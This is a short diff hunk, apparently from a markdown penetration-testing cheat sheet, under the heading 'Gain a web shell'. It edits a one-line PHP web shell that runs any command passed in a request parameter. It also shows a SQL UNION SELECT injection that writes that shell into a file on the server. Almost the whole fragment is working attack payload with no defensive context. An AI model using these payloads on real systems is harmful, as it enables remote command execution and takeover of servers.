@@ -58,7 +58,7 @@
 
 ### Gain a web shell
 #
-* <? system<meta>($_REQUEST['cmd']); ?>
+* <meta><? system($_REQUEST['cmd']); ?>
 * Create a file onm the server with a nonexistant user:
     * SELECT Password FROM Users WHERE Username='abc'
       UNION SELECT "<? system($_REQUEST['cmd']); ?>"
